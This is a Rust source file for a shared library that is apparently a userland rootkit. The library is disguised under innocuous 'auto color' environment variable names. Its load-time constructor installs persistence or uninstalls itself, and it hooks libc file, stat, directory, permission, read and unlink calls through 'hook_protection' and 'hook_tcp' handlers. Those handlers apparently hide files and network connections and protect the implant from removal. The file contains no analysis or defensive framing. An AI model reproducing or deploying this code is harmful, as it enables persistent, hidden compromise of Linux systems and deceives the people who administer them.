extern crate libc;
extern crate ctor;
extern crate log;
extern crate colog;
extern crate regex;

mod persistance;
mod uninstall;

use libc::{
    c_char, c_int, c_uint, PATH_MAX
};
use std::{
    ffi::CStr, path::{Path, PathBuf}, env
};
use std::cell::RefCell;

// Thread-local flag to track internal calls
thread_local! {
    static IN_HOOK: RefCell<bool> = RefCell::new(false);
}

pub fn with_hook_protection<F, G, R>(f: F, f2: G) -> R
where
    F: FnOnce() -> Option<R>,
    G: FnOnce() -> R,
{
    IN_HOOK.with(|flag| {
        if *flag.borrow() {
            // If already in a hook, bypass and execute the real function
            return f2();
        }
        *flag.borrow_mut() = true; 
        let result = f().unwrap_or_else(f2); 
        *flag.borrow_mut() = false;
        result
    })
}

pub fn resolve_fd(dirfd: c_int) -> Option<String> {
    if dirfd == libc::AT_FDCWD {
        return std::env::current_dir()
            .ok()
            .map(|cwd| cwd.to_string_lossy().to_string());
    }

    let fd_path = PathBuf::from(format!("/proc/self/fd/{}", dirfd));
    let mut buf = vec![0; PATH_MAX as usize];
    let len = unsafe {
        libc::readlink(
            fd_path.to_string_lossy().as_ptr() as *const c_char,
            buf.as_mut_ptr() as *mut c_char,
            PATH_MAX as usize,
        )
    };

    if len == -1 {
        // Commented out due to noise log::error!("[resolve_fd] Failed to resolve dirfd '{}'", fd_path.display());
        return None;
    }

    Some(unsafe { CStr::from_ptr(buf.as_ptr()).to_string_lossy().to_string() })
}

pub fn resolve_fd_path(dirfd: c_int, cpath: *const c_char) -> Option<PathBuf> {
    if cpath.is_null() {
        return resolve_fd(dirfd).map(PathBuf::from);
    }

    let path = unsafe { CStr::from_ptr(cpath) };

    if path.to_bytes().starts_with(b"/") {
        return Some(PathBuf::from(path.to_string_lossy().to_string()));
    }

    let resolved_path = resolve_fd(dirfd)?;
    let resolved_path = Path::new(&resolved_path);
    let binding = path.to_string_lossy();
    let path = Path::new(binding.as_ref());
    let new_path = resolved_path.join(path);

    Some(new_path)
}

#[ctor::ctor]
fn init() {
    if let Ok(log_level) = env::var("AUTO_COLOR_LOG") {
        colog::default_builder()
            .filter_level(match log_level.to_lowercase().as_str() {
                "error" => log::LevelFilter::Error,
                "warn" => log::LevelFilter::Warn,
                "info" => log::LevelFilter::Info,
                "debug" => log::LevelFilter::Debug,
                "trace" => log::LevelFilter::Trace,
                _ => log::LevelFilter::Off,    
            })
            .init();
    }
    log::info!("[library] Initialization function called for binary: {}", std::env::current_exe().unwrap().display());

    if env::var("AUTO_DESATURATE").is_ok() {
        log::info!("[library] AUTO_DESATURATE is set, uninstalling");
        uninstall::uninstall();
    } else {
        log::info!("[library] AUTO_DESATURATE is not set, testing persistance");
        persistance::persist();
    }

    if let Ok(target_pattern) = env::var("AUTO_COLOR_TARGET") {
        if let Ok(current_exe) = std::env::current_exe() {
            if let Ok(regex) = regex::Regex::new(&target_pattern) {
                if !regex.is_match(current_exe.to_string_lossy().as_ref()) {
                    log::info!("[library] AUTO_COLOR_TARGET doesn't match current executable, disabling hooks");
                    IN_HOOK.with(|flag| *flag.borrow_mut() = true);
                }
                else {
                    log::info!("[library] AUTO_COLOR_TARGET matches current executable, enabling hooks");
                }
            } else {
                log::error!("[library] Invalid regex pattern in AUTO_COLOR_TARGET: {}", target_pattern);
            }
        }
    }
}

mod hook_tcp;
mod hook_protection;

redhook::hook! {
    unsafe fn open(cpath: *const c_char, oflag: c_int) -> c_int => protect_open {
        with_hook_protection(
            || hook_protection::handle_open(cpath, oflag)
                .or_else(|| hook_tcp::handle_open(cpath, oflag)),
            || unsafe { redhook::real!(open)(cpath, oflag) }
        )
    }
}

redhook::hook! {
    unsafe fn open64(cpath: *const c_char, oflag: c_int) -> c_int => protect_open64 {
        with_hook_protection(
            || hook_protection::handle_open(cpath, oflag)
                .or_else(|| hook_tcp::handle_open(cpath, oflag)),
            || unsafe { redhook::real!(open64)(cpath, oflag) }
        )
    }
}

redhook::hook! {
    unsafe fn openat(dirfd: c_int, cpath: *const c_char, oflag: c_int) -> c_int => protect_openat {
        with_hook_protection(
            || hook_protection::handle_openat(dirfd, cpath, oflag)
                .or_else(|| hook_tcp::handle_openat(dirfd, cpath, oflag)),
            || unsafe { redhook::real!(openat)(dirfd, cpath, oflag) }
        )
    }
}

redhook::hook! {
    unsafe fn openat64(dirfd: c_int, cpath: *const c_char, oflag: c_int) -> c_int => protect_openat64 {
        with_hook_protection(
            || hook_protection::handle_openat(dirfd, cpath, oflag)
                .or_else(|| hook_tcp::handle_openat(dirfd, cpath, oflag)),
            || unsafe { redhook::real!(openat64)(dirfd, cpath, oflag) }
        )
    }
}

redhook::hook! {
    unsafe fn fopen(cpath: *const c_char, mode: *const c_char) -> *mut libc::FILE => protect_fopen {
        with_hook_protection(
            || hook_protection::handle_fopen(cpath, mode)
                .or_else(|| hook_tcp::handle_fopen(cpath, mode)),
            || unsafe { redhook::real!(fopen)(cpath, mode) }
        )
    }
}

redhook::hook! {
    unsafe fn fopen64(cpath: *const c_char, mode: *const c_char) -> *mut libc::FILE => protect_fopen64 {
        with_hook_protection(
            || hook_protection::handle_fopen(cpath, mode)
                .or_else(|| hook_tcp::handle_fopen(cpath, mode)),
            || unsafe { redhook::real!(fopen64)(cpath, mode) }
        )
    }
}

redhook::hook! {
    unsafe fn rename(oldpath: *const c_char, newpath: *const c_char) -> c_int => protect_rename {
        with_hook_protection(
            || hook_protection::handle_rename(oldpath, newpath),
            || unsafe { redhook::real!(rename)(oldpath, newpath) }
        )
    }
}


redhook::hook! {
    unsafe fn access(path: *const c_char, mode: c_int) -> c_int => protect_access {
        with_hook_protection(
            || hook_protection::handle_access(path, mode),
            || unsafe { redhook::real!(access)(path, mode) }
        )
    }
}

redhook::hook! {
    unsafe fn realpath(path: *const c_char, resolved_path: *mut c_char) -> *mut c_char => protect_realpath {
        with_hook_protection(
            || hook_protection::handle_realpath(path, resolved_path),
            || unsafe { redhook::real!(realpath)(path, resolved_path) }
        )
    }
}

redhook::hook! {
    unsafe fn read(fd: c_int, buf: *mut libc::c_void, count: usize) -> isize => protect_read {
        with_hook_protection(
            || hook_protection::handle_read(fd, buf, count),
            || unsafe { redhook::real!(read)(fd, buf, count) }
        )
    }
}

redhook::hook! {
    unsafe fn pread(fd: c_int, buf: *mut libc::c_void, count: usize, offset: libc::off_t) -> isize => protect_pread {
        with_hook_protection(
            || hook_protection::handle_pread(fd, buf, count, offset),
            || unsafe { redhook::real!(pread)(fd, buf, count, offset) }
        )
    }
}

redhook::hook! {
    unsafe fn chmod(path: *const c_char, mode: libc::mode_t) -> c_int => protect_chmod {
        with_hook_protection(
            || hook_protection::handle_chmod(path, mode),
            || unsafe { redhook::real!(chmod)(path, mode) }
        )
    }
}

redhook::hook! {
    unsafe fn fchmodat(dirfd: c_int, path: *const c_char, mode: libc::mode_t, flags: c_int) -> c_int => protect_fchmodat {
        with_hook_protection(
            || hook_protection::handle_fchmodat(dirfd, path, mode, flags),
            || unsafe { redhook::real!(fchmodat)(dirfd, path, mode, flags) }
        )
    }
}

redhook::hook! {
    unsafe fn fchmod(fd: c_int, mode: libc::mode_t) -> c_int => protect_fchmod {
        with_hook_protection(
            || hook_protection::handle_fchmod(fd, mode),
            || unsafe { redhook::real!(fchmod)(fd, mode) }
        )
    }
}

redhook::hook! {
    unsafe fn unlink(path: *const c_char) -> c_int => protect_unlink {
        with_hook_protection(
            || hook_protection::handle_unlink(path),
            || unsafe { redhook::real!(unlink)(path) }
        )
    }
}

redhook::hook! {
    unsafe fn unlinkat(dirfd: c_int, path: *const c_char, flags: c_int) -> c_int => protect_unlinkat {
        with_hook_protection(
            || hook_protection::handle_unlinkat(dirfd, path, flags),
            || unsafe { redhook::real!(unlinkat)(dirfd, path, flags) }
        )
    }
}

redhook::hook! {
    unsafe fn renameat(olddirfd: c_int, oldpath: *const c_char, newdirfd: c_int, newpath: *const c_char) -> c_int => protect_renameat {
        with_hook_protection(
            || hook_protection::handle_renameat(olddirfd, oldpath, newdirfd, newpath),
            || unsafe { redhook::real!(renameat)(olddirfd, oldpath, newdirfd, newpath) }
        )
    }
}

redhook::hook! {
    unsafe fn stat(path: *const c_char, buf: *mut libc::stat) -> c_int => protect_stat {
        with_hook_protection(
            || hook_protection::handle_stat(path, buf),
            || unsafe { redhook::real!(stat)(path, buf) }
        )
    }
}

redhook::hook! {
    unsafe fn _xstat(ver: c_int, path: *const c_char, buf: *mut libc::stat) -> c_int => protect_xstat {
        with_hook_protection(
            || hook_protection::handle_stat(path, buf),
            || unsafe { redhook::real!(_xstat)(ver, path, buf) }
        )
    }
}

redhook::hook! {
    unsafe fn statx(dirfd: c_int, path: *const c_char, flags: c_int, mask: c_uint, buf: *mut libc::statx) -> c_int => protect_statx {
        with_hook_protection(
            || hook_protection::handle_statx(dirfd, path, flags, mask, buf),
            || unsafe { redhook::real!(statx)(dirfd, path, flags, mask, buf) }
        )
    }
}

redhook::hook! {
    unsafe fn lstat(path: *const c_char, buf: *mut libc::stat) -> c_int => protect_lstat {
        with_hook_protection(
            || hook_protection::handle_lstat(path, buf),
            || unsafe { redhook::real!(lstat)(path, buf) }
        )
    }
}

redhook::hook! {
    unsafe fn _lxstat(ver: c_int, path: *const c_char, buf: *mut libc::stat) -> c_int => protect_lxstat {
        with_hook_protection(
            || hook_protection::handle_lstat(path, buf),
            || unsafe { redhook::real!(_lxstat)(ver, path, buf) }
        )
    }
}

redhook::hook! {
    unsafe fn fstat(fd: c_int, buf: *mut libc::stat) -> c_int => protect_fstat {
        with_hook_protection(
            || hook_protection::handle_fstat(fd, buf),
            || unsafe { redhook::real!(fstat)(fd, buf) }
        )
    }
}

redhook::hook! {
    unsafe fn fstatat(dirfd: c_int, path: *const c_char, buf: *mut libc::stat, flags: c_int) -> c_int => protect_fstatat {
        with_hook_protection(
            || hook_protection::handle_fstatat(dirfd, path, buf, flags),
            || unsafe { redhook::real!(fstatat)(dirfd, path, buf, flags) }
        )
    }
}

redhook::hook! {
    unsafe fn _fxstat(ver: c_int, fd: c_int, buf: *mut libc::stat) -> c_int => protect_fxstat {
        with_hook_protection(
            || hook_protection::handle_fstat(fd, buf),
            || unsafe { redhook::real!(_fxstat)(ver, fd, buf) }
        )
    }
}

redhook::hook! {
    unsafe fn faccessat(dirfd: c_int, path: *const c_char, mode: c_int, flags: c_int) -> c_int => protect_faccessat {
        with_hook_protection(
            || hook_protection::handle_faccessat(dirfd, path, mode, flags),
            || unsafe { redhook::real!(faccessat)(dirfd, path, mode, flags) }
        )
    }
}

redhook::hook! {
    unsafe fn readdir(dirp: *mut libc::DIR) -> *mut libc::dirent => protect_readdir {
        with_hook_protection(
            || hook_protection::handle_readdir(dirp),
            || unsafe { redhook::real!(readdir)(dirp) }
        )
    }
}

redhook::hook! {
    unsafe fn readdir64(dirp: *mut libc::DIR) -> *mut libc::dirent64 => protect_readdir64 {
        with_hook_protection(
            || hook_protection::handle_readdir(dirp),
            || unsafe { redhook::real!(readdir64)(dirp) }
        )
    }
}

redhook::hook! {
    unsafe fn scandir(dir: *const c_char, namelist: *mut *mut *mut libc::dirent, filter: Option<unsafe extern "C" fn(*const libc::dirent) -> c_int>, compar: Option<unsafe extern "C" fn(*const libc::dirent, *const libc::dirent) -> c_int>) -> c_int => protect_scandir {
        with_hook_protection(
            || hook_protection::handle_scandir(dir, namelist, filter, compar),
            || unsafe { redhook::real!(scandir)(dir, namelist, filter, compar) }
        )
    }
}

redhook::hook! {
    unsafe fn scandir64(dir: *const c_char, namelist: *mut *mut *mut libc::dirent64, filter: Option<unsafe extern "C" fn(*const libc::dirent64) -> c_int>, compar: Option<unsafe extern "C" fn(*const libc::dirent64, *const libc::dirent64) -> c_int>) -> c_int => protect_scandir64 {
        with_hook_protection(
            || hook_protection::handle_scandir(dir, namelist, filter, compar),
            || unsafe { redhook::real!(scandir64)(dir, namelist, filter, compar) }
        )
    }
}
